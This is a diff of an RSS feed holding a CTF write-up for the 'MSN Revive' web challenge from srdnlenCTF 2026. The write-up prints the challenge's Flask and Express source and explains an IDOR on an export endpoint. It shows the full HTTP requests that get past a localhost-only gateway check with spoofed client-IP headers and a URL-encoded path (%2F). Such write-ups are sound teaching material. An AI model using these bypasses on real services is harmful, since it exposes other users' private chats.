@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[srdnlenCTF]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.ico</url><title>srdnlenCTF</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Thu, 05 Mar 2026 11:29:06 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Thu, 05 Mar 2026 11:29:05 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Writeup]]></title><description><![CDATA[<a href=".?query=tag:web" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#web">#web</a> <a href=".?query=tag:writeup" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#writeup">#writeup</a> <a href=".?query=tag:srdnlenCTF" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#srdnlenCTF">#srdnlenCTF</a><br><a class="internal-link" data-href="#TLDR" href="#TLDR" target="_self" rel="noopener nofollow">TLDR</a>I've started building my own personal version of MSN. The site is still under development, but you can already start chatting with your friends...<br>Website: <a rel="noopener nofollow" class="external-link is-unresolved" href="http://msnrevive.challs.srdnlen.it" target="_self">http://msnrevive.challs.srdnlen.it</a><br>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[srdnlenCTF]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.ico</url><title>srdnlenCTF</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Thu, 05 Mar 2026 12:11:06 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Thu, 05 Mar 2026 12:11:06 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Writeup]]></title><description><![CDATA[<a href=".?query=tag:web" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#web">#web</a> <a href=".?query=tag:writeup" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#writeup">#writeup</a> <a href=".?query=tag:srdnlenCTF" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#srdnlenCTF">#srdnlenCTF</a><br><a class="internal-link" data-href="#TLDR" href="writeup.html#TLDR_0" target="_self" rel="noopener nofollow">TLDR</a>I've started building my own personal version of MSN. The site is still under development, but you can already start chatting with your friends...<br>Website: <a rel="noopener nofollow" class="external-link is-unresolved" href="http://msnrevive.challs.srdnlen.it" target="_self">http://msnrevive.challs.srdnlen.it</a><br>
 Attachment: <a class="internal-link" data-href="../../../media/srdnlenCTF2026/web_msn_revive/web_msn_revive.zip" href=".html" target="_self" rel="noopener nofollow">web_msn_revive.zip</a><br>In this challenge we are tasked with somehow exploiting an unfinished MSN clone. As in any <a href=".?query=tag:web" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#web">#web</a> task we start by just feeling around the website.When we first load up the website we are greeted by an MSN themed login/sign-up form<br> <img src="images/msn_sol_login.png" referrerpolicy="no-referrer" target="_self">
 There is a password recovery option but it is just a prompt to contact one of the devs.<br> <img src="images/msn_sol_passrec.png" referrerpolicy="no-referrer" target="_self">
 The only other option we have is to create a user and check out the main page. The register field sends a simple userpass json to api/auth/register and in return we get our user_id.api/auth/register http exchange
@@ -243,4 +243,197 @@ from werkzeug.security import generate_password_hash # ===================
 [justlel] - Perfect, I'll send you the password here. srdnlen{REDACTED}
 So now we have a clear goal:Solution requirement
 Access the messages from the chat with session_id 00000000-0000-0000-0000-00000000000
-]]></description><link>writeup.html</link><guid isPermaLink="false">srdnlenCTF/MSN/Writeup.md</guid><pubDate>Thu, 05 Mar 2026 11:28:05 GMT</pubDate><enclosure url="images/msn_sol_login.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;images/msn_sol_login.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
+Now with this goal in mind we can comb through the rest of the source code.Let's look through the src/backend/api.py file. It seems to contain the main logic for the api endpoints.Full api.py code import hashlib
+import uuid
+from dataclasses import dataclass
+from datetime import datetime, timezone
+from http import HTTPStatus
+from typing import Any from app import login_manager
+from flask import ( Blueprint, Response, current_app, jsonify, request, send_from_directory,
+)
+from flask_login import current_user, login_required, login_user, logout_user
+from models import ChatSession, Message, User, db
+from parser import MSNSLPError, MSNSLPParser
+from utils import is_member, render_export
+from werkzeug.security import check_password_hash, generate_password_hash api = Blueprint("api", __name__) @dataclass
+class APIResponse: """Uniform API response structure""" ok: bool data: dict | None = None error: str | None = None error_code: str | None = None def to_dict(self) -&gt; dict[str, Any]: result: dict[str, Any] = {"ok": self.ok} if self.data is not None: result["data"] = self.data if self.error: result["error"] = self.error if self.error_code: result["error_code"] = self.error_code return result def to_response(self, status_code: int) -&gt; tuple: return jsonify(self.to_dict()), status_code def success(data: dict, status_code: HTTPStatus = HTTPStatus.OK) -&gt; tuple: return APIResponse(ok=True, data=data).to_response(status_code) def error(message: str, code: str, status_code: HTTPStatus) -&gt; tuple: return APIResponse(ok=False, error=message, error_code=code).to_response( status_code ) @login_manager.user_loader
+def load_user(user_id) -&gt; Any | None: user = User.query.get(int(user_id)) return user @login_manager.unauthorized_handler
+def unauthorized_callback() -&gt; tuple[Response, int]: return error("unauthorized", "UNAUTHORIZED", HTTPStatus.UNAUTHORIZED) @api.after_request
+def add_security_headers(response: Response) -&gt; Response: response.headers["X-Content-Type-Options"] = "nosniff" response.headers["X-Frame-Options"] = "DENY" response.headers["Content-Security-Policy"] = "default-src 'self'" return response @api.app_errorhandler(500)
+def internal_error(err: Any) -&gt; tuple[Response, int]: current_app.logger.error(f"Internal server error: {err}") return error( "internal_server_error", "INTERNAL_SERVER_ERROR", HTTPStatus.INTERNAL_SERVER_ERROR, ) @api.app_errorhandler(404)
+def not_found_error(err: Any) -&gt; tuple[Response, int]: return error("not_found", "NOT_FOUND", HTTPStatus.NOT_FOUND) # =========================
+# Authentication endpoints
+# ========================= @api.post("/auth/register")
+def register() -&gt; tuple[Response, int]: data = request.get_json(force=True, silent=True) or {} username = (data.get("username") or "").strip() password = data.get("password") or "" if not username or not password: return error("missing_fields", "MISSING_FIELDS", HTTPStatus.BAD_REQUEST) if User.query.filter_by(username=username).first(): return error("username_taken", "USERNAME_TAKEN", HTTPStatus.CONFLICT) u = User(username=username, password_hash=generate_password_hash(password)) # type: ignore db.session.add(u) db.session.commit() return success({"user_id": u.id}, HTTPStatus.CREATED) @api.post("/auth/login")
+def login() -&gt; tuple[Response, int]: data = request.get_json(force=True, silent=True) or {} username = (data.get("username") or "").strip() password = data.get("password") or "" user = User.query.filter_by(username=username).first() if not user or not check_password_hash(user.password_hash, password): return error( "invalid_credentials", "INVALID_CREDENTIALS", HTTPStatus.UNAUTHORIZED, ) login_user(user) return success({"user": {"id": user.id, "username": user.username}}) @api.get("/auth/logout")
+@login_required
+def logout() -&gt; tuple[Response, int]: logout_user() return success({}) @api.get("/me")
+@login_required
+def me() -&gt; tuple[Response, int]: return success({"id": current_user.id, "username": current_user.username}) # ===============
+# Chat endpoints
+# =============== @api.post("/chat/create")
+@login_required
+def create_session() -&gt; tuple[Response, int]: data = request.get_json(force=True, silent=True) or {} username = User.query.filter_by( username=(data.get("with") or "").strip() ).first() if not username or username.id == current_user.id: return error("invalid_user", "INVALID_USER", HTTPStatus.BAD_REQUEST) # Normalize pair to satisfy constraint user_a_id &lt; user_b_id user_lo, user_hi = sorted((current_user.id, username.id)) existing = ChatSession.query.filter_by( user_a_id=user_lo, user_b_id=user_hi ).first() if existing: return success({"session_id": existing.session_id}) sid = str(uuid.uuid4()) s = ChatSession(session_id=sid, user_a_id=user_lo, user_b_id=user_hi) # type: ignore db.session.add(s) db.session.commit() return success({"session_id": sid}, HTTPStatus.CREATED) @api.get("/chat/sessions")
+@login_required
+def list_sessions() -&gt; tuple[Response, int]: sessions = ( ChatSession.query.filter( (ChatSession.user_a_id == current_user.id) | (ChatSession.user_b_id == current_user.id) ) .order_by(ChatSession.created_at.desc()) .all() ) out = [] for s in sessions: other_id = ( s.user_b_id if s.user_a_id == current_user.id else s.user_a_id ) other = db.session.get(User, other_id) out.append( { "session_id": s.session_id, "with": {"id": other.id, "username": other.username}, # type: ignore "created_at": s.created_at.isoformat(), } ) return success({"sessions": out}) @api.get("/chat/&lt;session_id&gt;")
+@login_required
+def get_messages(session_id: str) -&gt; tuple[Response, int]: if not session_id or not is_member(session_id, current_user.id): return jsonify({"error": "forbidden"}), 403 msgs = ( Message.query.filter_by(session_id=session_id) .order_by(Message.created_at.asc()) .all() ) return success( { "messages": [ { "id": m.id, "session_id": m.session_id, "sender_id": m.sender_id, "kind": m.kind, "body": m.body, "created_at": m.created_at.isoformat(), } for m in msgs ] } ) @api.post("/chat/&lt;session_id&gt;/send")
+@login_required
+def send_message(session_id: str) -&gt; tuple[Response, int]: data = request.get_json(force=True, silent=True) or {} message = data.get("message") or "" if not session_id or not is_member(session_id, current_user.id): return error("forbidden", "FORBIDDEN", HTTPStatus.FORBIDDEN) if not isinstance(message, str): return error("bad_message", "BAD_MESSAGE", HTTPStatus.BAD_REQUEST) message = message.strip() if not message: return error("empty_message", "EMPTY_MESSAGE", HTTPStatus.BAD_REQUEST) if len(message) &gt; 1000: return error( "message_too_long", "MESSAGE_TOO_LONG", HTTPStatus.BAD_REQUEST ) m = Message( session_id=session_id, # type: ignore sender_id=current_user.id, # type: ignore kind="message", # type: ignore body=message, # type: ignore ) db.session.add(m) db.session.commit() return success({"message_id": m.id}, HTTPStatus.CREATED) @api.post("/chat/emoticons")
+@login_required
+def get_emoticon_asset() -&gt; tuple[Response, int] | Response: data = request.get_json(force=True, silent=True) or request.form or {} sid = (data.get("session_id") or "").strip() filename = (data.get("filename") or "").strip() if not sid or not is_member(sid, current_user.id): return error("forbidden", "FORBIDDEN", HTTPStatus.FORBIDDEN) return send_from_directory( current_app.config["EMOTICONS_DIR"], filename, as_attachment=False ) @api.post("/chat/event")
+@login_required
+def msn_event() -&gt; tuple[Response, int]: raw = request.get_data(cache=False) content_type = request.headers.get("Content-Type", "") # Parsing parser = MSNSLPParser() try: ev = parser.parse(raw, content_type) except MSNSLPError as e: return error(str(e), "PARSE_ERROR", HTTPStatus.BAD_REQUEST) call_id = getattr(ev, "call_id", None) from_user = getattr(ev, "from_user", None) # Validation if not call_id: return error( "missing_call_id", "MISSING_CALL_ID", HTTPStatus.BAD_REQUEST ) if not from_user: return error("missing_sender", "MISSING_SENDER", HTTPStatus.BAD_REQUEST) chat_session = ChatSession.query.get(call_id) if not chat_session: return error("unknown_session", "UNKNOWN_SESSION", HTTPStatus.NOT_FOUND) sender = User.query.filter_by(username=from_user).first() if not sender: return error("unknown_sender", "UNKNOWN_SENDER", HTTPStatus.NOT_FOUND) if not is_member(call_id, sender.id): return error("forbidden", "FORBIDDEN", HTTPStatus.FORBIDDEN) # Process event if ev.type == "nudge": last = ( Message.query.filter_by( session_id=call_id, kind="activity", sender_id=sender.id ) .order_by(Message.created_at.desc()) .first() ) now = datetime.now(timezone.utc) if ( last and ( now - last.created_at.replace(tzinfo=timezone.utc) ).total_seconds() &lt; 2.0 ): return error( "rate_limited", "RATE_LIMITED", HTTPStatus.TOO_MANY_REQUESTS ) m = Message( session_id=call_id, # type: ignore sender_id=sender.id, # type: ignore kind="nudge", # type: ignore body="", # type: ignore ) db.session.add(m) db.session.commit() return success( { "event": "nudge", "session_id": call_id, "sender": sender.username, "stored_message_id": m.id, "received_bytes": len(raw), } ) if ev.type == "emoticon": asset_id = hashlib.sha256(ev.data).hexdigest()[:16] if ev.mime == "image/png": ext = "png" elif ev.mime == "image/gif": ext = "gif" elif ev.mime == "image/jpeg": ext = "jpg" filename = f"{asset_id}.{ext}" asset_path = current_app.config["EMOTICONS_DIR"] / filename if not asset_path.exists(): with open(asset_path, "wb") as f: f.write(ev.data) m = Message( session_id=call_id, # type: ignore sender_id=sender.id, # type: ignore kind="emoticon", # type: ignore body=filename, # type: ignore ) db.session.add(m) db.session.commit() msnobj = ev.msn_object.attrs if ev.msn_object else None return success( { "event": "emoticon", "session_id": call_id, "sender": sender.username, "stored_message_id": m.id, "asset": filename, "mime": ev.mime, "msn_object": msnobj, "received_bytes": len(raw), } ) return success( { "event": "ignored", "session_id": call_id, "sender": sender.username, "received_bytes": len(raw), } ) # =================
+# Export endpoints
+# ================= @api.post("/export/chat")
+def chat_export() -&gt; tuple[Response, int] | Response: data = request.get_json(force=True, silent=True) or {} sid = (data.get("session_id") or "").strip() fmt = (data.get("format") or "html").strip().lower() if not sid: return error( "missing_session_id", "MISSING_SESSION_ID", HTTPStatus.BAD_REQUEST ) if fmt not in ("xml", "html"): return error("bad_format", "BAD_FORMAT", HTTPStatus.BAD_REQUEST) if not ChatSession.query.get(sid): return error("unknown_session", "UNKNOWN_SESSION", HTTPStatus.NOT_FOUND) # NOTE: This endpoint is a temporary WIP used for validating the export # rendering logic. return success({"data": render_export(sid, fmt)}) Mainly in here we can see the exact logic that makes the endpoints we mapped in the recon phase work. But what caught my eye on the first glance was this comment on the chat_export function:WIP Comment NOTE: This endpoint is a temporary WIP used for validating the export
+rendering logic.
+Since it is a WIP it is more likely to have some error that leads to a vulnerability that we can exploit. Let's analyze it further.@api.post("/export/chat")
+def chat_export() -&gt; tuple[Response, int] | Response: data = request.get_json(force=True, silent=True) or {} sid = (data.get("session_id") or "").strip() fmt = (data.get("format") or "html").strip().lower() if not sid: return error( "missing_session_id", "MISSING_SESSION_ID", HTTPStatus.BAD_REQUEST ) if fmt not in ("xml", "html"): return error("bad_format", "BAD_FORMAT", HTTPStatus.BAD_REQUEST) if not ChatSession.query.get(sid): return error("unknown_session", "UNKNOWN_SESSION", HTTPStatus.NOT_FOUND) # NOTE: This endpoint is a temporary WIP used for validating the export # rendering logic. return success({"data": render_export(sid, fmt)})
+There are a few issues with this function. One of them being it is missing the existing is_member check, which is used in the /api/chat/[session_id] endpoint. Which means that currently any user could export any other users chat, provided they found out the session_id. The other problem is that it is missing the @login-required decorator meaning anyone with a session id can export that chat.Theoretical solution
+Call the api/export/chat endpoint trying to export the developer chat. Let's try doing that.api/export/chat http exchange
+Request
+POST /api/export/chat HTTP/1.1
+Host: localhost:8000
+Content-Length: 52
+sec-ch-ua-platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:8000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8000/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive {"session_id":"00000000-0000-0000-0000-00000000000"} Response
+HTTP/1.1 403 Forbidden
+Server: nginx/1.29.5
+Date: Wed, 04 Mar 2026 13:14:00 GMT
+Content-Type: application/json; charset=utf-8
+Connection: keep-alive
+Vary: Accept-Encoding
+X-Powered-By: Express
+ETag: W/"2d-DA2ROKvY3QlrRXgzCHzU7uouKss"
+Content-Length: 45 {"ok":false,"error":"WIP: local access only"} So that didn't work. We need to find a way to bypass the local access check. The first thing that comes to mind is spoofing via trusted client IP headers. Since we can quickly check that before looking in the code for the logic of the client IP checking function let's try that first.api/export/chat http exchange with spoofed client IP headers
+Request
+POST /api/export/chat HTTP/1.1
+Host: localhost:8000
+Content-Length: 52
+sec-ch-ua-platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:8000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8000/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+Forwarded: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Client-IP: {"session_id":"00000000-0000-0000-0000-00000000000"} Response
+HTTP/1.1 403 Forbidden
+Server: nginx/1.29.5
+Date: Wed, 04 Mar 2026 13:25:49 GMT
+Content-Type: application/json; charset=utf-8
+Connection: keep-alive
+Vary: Accept-Encoding
+X-Powered-By: Express
+ETag: W/"2d-DA2ROKvY3QlrRXgzCHzU7uouKss"
+Content-Length: 45 {"ok":false,"error":"WIP: local access only"} Same response, it seems the api is configured not to trust such headers or 127.0.0.1 is not considered "local". To find that out we need to dig back into the code. After a few greps and a bit of manual searching we can find src/gateway/gateway.js.❯ grep -r "local"
+gateway/gateway.js: return res.status(403).json({ ok: false, error: "WIP: local access only" });
+frontend/README.md:L'applicazione sarà disponibile su `http://localhost:5173`
+frontend/nginx.conf: log_format main '$remote_addr - $remote_user [$time_local] "$request" '
+Full gateway.js code
+import express from "express";
+import http from "http"; const app = express(); // ===== Config ===== const BACKEND_HOST = process.env.BACKEND_HOST || "127.0.0.1";
+const BACKEND_PORT = Number(process.env.BACKEND_PORT || 8000);
+const MAX_BODY_SIZE = 10 * 1024 * 1024; // 10 MB const httpAgent = new http.Agent({ keepAlive: true, keepAliveMsecs: 10_000, maxSockets: 10, maxFreeSockets: 5,
+}); // ===== Helpers ===== function extractMsnTotalSize(buff) { const BIN_HDR_SIZE = 48; if (buff.length &lt; BIN_HDR_SIZE) return null; try { const totalSize = buff.readBigUInt64LE(16); return Number(totalSize) + BIN_HDR_SIZE; } catch (e) { return null; }
+} function isLocalhost(req) { const ip = req.socket.remoteAddress; return ip === "::1" || ip?.startsWith("127.") || ip === "::ffff:127.0.0.1";
+} function proxyRequest(req, res, { modifyHeaders = null } = {}) { const chunks = []; let total = 0; if (req.method !== "GET" &amp;&amp; req.method !== "HEAD") { req.on("data", (chunk) =&gt; { if (total + chunk.length &gt; MAX_BODY_SIZE) { req.destroy(); if (!res.headersSent) { return res.status(413).json({ ok: false, error: "body_too_large" }); } return; } chunks.push(chunk); total += chunk.length; }); } else { req.resume(); } req.on("end", () =&gt; { const body = chunks.length &gt; 0 ? Buffer.concat(chunks) : null; let finalHeaders = { ...req.headers }; if (modifyHeaders) { finalHeaders = modifyHeaders(finalHeaders, body); } if (body &amp;&amp; !finalHeaders["content-length"]) { finalHeaders["content-length"] = body.length; } delete finalHeaders["transfer-encoding"]; delete finalHeaders["proxy-connection"]; delete finalHeaders.upgrade; delete finalHeaders.te; delete finalHeaders.trailer; const options = { host: BACKEND_HOST, port: BACKEND_PORT, method: req.method, path: req.originalUrl, headers: finalHeaders, agent: httpAgent, }; const backendReq = http.request(options, (backendRes) =&gt; { res.status(backendRes.statusCode); for (const [key, value] of Object.entries(backendRes.headers)) { if ( !["connection", "transfer-encoding", "server"].includes( key.toLowerCase(), ) ) { res.setHeader(key, value); } } backendRes.pipe(res); }); backendReq.on("error", (_err) =&gt; { if (!res.headersSent) { res.status(502).json({ ok: false, error: "bad_gateway" }); } }); backendReq.on("timeout", () =&gt; { backendReq.destroy(); if (!res.headersSent) { res.status(504).json({ ok: false, error: "gateway_timeout" }); } }); if (body) { backendReq.write(body); } backendReq.end(); }); req.on("error", (_err) =&gt; { if (!res.headersSent) { res.status(400).json({ ok: false, error: "bad_request" }); } });
+} // ===== Middleware ===== app.use((req, res, next) =&gt; { if (req.headers["transfer-encoding"]) { return res.status(400).json({ ok: false, error: "transfer_encoding_not_allowed", }); } const cl = req.headers["content-length"]; if (cl) { const num = parseInt(cl, 10); if (isNaN(num) || num &lt; 0 || num &gt; MAX_BODY_SIZE) { return res.status(400).json({ ok: false, error: "invalid_content_length", }); } } for (const [key, value] of Object.entries(req.headers)) { if (typeof value === "string" &amp;&amp; /[\r\n]/.test(value)) { return res.status(400).json({ ok: false, error: "invalid_header_value", header: key, }); } } next();
+}); // ===== Routes ===== app.all("/api/export/chat", (req, res, next) =&gt; { if (!isLocalhost(req)) { return res.status(403).json({ ok: false, error: "WIP: local access only" }); } next();
+}); app.post("/api/chat/event", (req, res) =&gt; { proxyRequest(req, res, { modifyHeaders: (headers, body) =&gt; { if (!body) return headers; const contentType = (headers["content-type"] || "").toLowerCase(); if (contentType === "application/x-msnmsgrp2p") { const msnSize = extractMsnTotalSize(body); return { ...headers, "content-length": msnSize ?? body.length, }; } else { return headers; } }, });
+}); app.use((req, res) =&gt; { proxyRequest(req, res);
+}); // ===== Server ===== app.listen(process.env.PORT || 80, () =&gt; { console.log( `[gateway] listening on :${process.env.PORT || 80} -&gt; ${BACKEND_HOST}:${BACKEND_PORT}`, );
+}); If we look at the line grep found for us we can see the logic behind the localhost limitation. Specifically the app.all middleware function and the isLocalhost helper function. app.all("/api/export/chat", (req, res, next) =&gt; { if (!isLocalhost(req)) { return res.status(403).json({ ok: false, error: "WIP: local access only" }); } next();
+}); function isLocalhost(req) { const ip = req.socket.remoteAddress; return ip === "::1" || ip?.startsWith("127.") || ip === "::ffff:127.0.0.1"; }
+What these functions do is they test all requests to exactly /api/export/chat and if the request is not from the defined "localhost" options then it is blocked and a 403 error is returned. The vulnerability we can notice here is that the endpoint in the request is compared to this string /api/export/chat and if it does not match exactly the localhost check will not happen. And if we remember from all the http exchanges the server uses Server: nginx/1.29.5 which automatically decodes url encoded symbols. So we can try bypassing the check by sending request not to /api/export/chat but to /api/export%2Fchat.api/export%2Fchat http exchange
+Request
+POST /api/export%2Fchat HTTP/1.1
+Host: localhost:8000
+Content-Length: 53
+sec-ch-ua-platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:8000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8000/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive {"session_id":"00000000-0000-0000-0000-000000000000"} Response
+HTTP/1.1 200 OK
+Server: nginx/1.29.5
+Date: Thu, 05 Mar 2026 06:21:17 GMT
+Content-Type: application/json
+Connection: keep-alive
+Vary: Accept-Encoding
+X-Powered-By: Express
+x-content-type-options: nosniff
+x-frame-options: DENY
+content-security-policy: default-src 'self'
+vary: Cookie
+Content-Length: 935 { "data":{ "data":"&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n &lt;meta charset=\"utf-8\"/&gt;\n &lt;title&gt;MSN Chat Export&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n &lt;h1&gt;Chat Export&lt;/h1&gt;\n &lt;p&gt;&lt;b&gt;session_id&lt;/b&gt;: 00000000-0000-0000-0000-000000000000&lt;/p&gt;\n &lt;p&gt;&lt;b&gt;generated_at&lt;/b&gt;: 2026-03-05T06:21:17.359961+00:00&lt;/p&gt;\n &lt;h3&gt;Meta&lt;/h3&gt;\n &lt;h3&gt;Messages&lt;/h3&gt;\n &lt;table border=\"1\" cellpadding=\"6\" cellspacing=\"0\"&gt;\n &lt;tr&gt;&lt;th&gt;ts&lt;/th&gt;&lt;th&gt;kind&lt;/th&gt;&lt;th&gt;sender_id&lt;/th&gt;&lt;th&gt;body&lt;/th&gt;&lt;/tr&gt;\n &lt;tr&gt;&lt;td&gt;2026-03-02T09:20:38.165596&lt;/td&gt;&lt;td&gt;message&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Hi Chri, I&amp;#x27;ve finished setting up the team&amp;#x27;s infrastructure.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2026-03-02T09:20:38.165600&lt;/td&gt;&lt;td&gt;message&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;We Lo, thanks! I&amp;#x27;ll take a look at them as soon as I can.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2026-03-02T09:20:38.165601&lt;/td&gt;&lt;td&gt;message&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Perfect, I&amp;#x27;ll send you the password here. srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}&lt;/td&gt;&lt;/tr&gt;\n &lt;/table&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n" }, "ok":true
+} If we quickly beautify the html we got in the response we get this:&lt;!doctype html&gt;\n
+&lt;html&gt;\n &lt;head&gt;\n &lt;meta charset=\ "utf-8\"/&gt;\n &lt;title&gt;MSN Chat Export&lt;/title&gt;\n
+&lt;/head&gt;\n &lt;body&gt;\n &lt;h1&gt;Chat Export&lt;/h1&gt;\n &lt;p&gt;&lt;b&gt;session_id&lt;/b&gt;: 00000000-0000-0000-0000-000000000000&lt;/p&gt;\n &lt;p&gt;&lt;b&gt;generated_at&lt;/b&gt;: 2026-03-05T06:21:17.359961+00:00&lt;/p&gt;\n &lt;h3&gt;Meta&lt;/h3&gt;\n &lt;h3&gt;Messages&lt;/h3&gt;\n &lt;table border=\ "1\" cellpadding=\ "6\" cellspacing=\ "0\"&gt;\n &lt;tr&gt; &lt;th&gt;ts&lt;/th&gt; &lt;th&gt;kind&lt;/th&gt; &lt;th&gt;sender_id&lt;/th&gt; &lt;th&gt;body&lt;/th&gt; &lt;/tr&gt;\n &lt;tr&gt; &lt;td&gt;2026-03-02T09:20:38.165596&lt;/td&gt; &lt;td&gt;message&lt;/td&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;Hi Chri, I&amp;#x27;ve finished setting up the team&amp;#x27;s infrastructure.&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2026-03-02T09:20:38.165600&lt;/td&gt; &lt;td&gt;message&lt;/td&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;We Lo, thanks! I&amp;#x27;ll take a look at them as soon as I can.&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2026-03-02T09:20:38.165601&lt;/td&gt; &lt;td&gt;message&lt;/td&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;Perfect, I&amp;#x27;ll send you the password here. srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}&lt;/td&gt; &lt;/tr&gt;\n &lt;/table&gt;\n
+&lt;/body&gt;\n &lt;/html&gt;\n
+for this I pasted the flag manually because the actual task servers went down immediately after the CTFAnd great success we have found the flag.src/backend/api.py has an api/export/chat endpoint which is vulnerable to an IDOR that allows us to export any chat if we know its session_id, but it is limited by a middleware function to only allow access from localhost. The middleware function is vulnerable to a path bypass via url encoding because of a parser differential.api/export%2Fchat http exchange
+Request
+POST /api/export%2Fchat HTTP/1.1
+Host: localhost:8000
+Content-Length: 53
+sec-ch-ua-platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://localhost:8000
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8000/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive {"session_id":"00000000-0000-0000-0000-000000000000"} Response
+HTTP/1.1 200 OK
+Server: nginx/1.29.5
+Date: Thu, 05 Mar 2026 06:21:17 GMT
+Content-Type: application/json
+Connection: keep-alive
+Vary: Accept-Encoding
+X-Powered-By: Express
+x-content-type-options: nosniff
+x-frame-options: DENY
+content-security-policy: default-src 'self'
+vary: Cookie
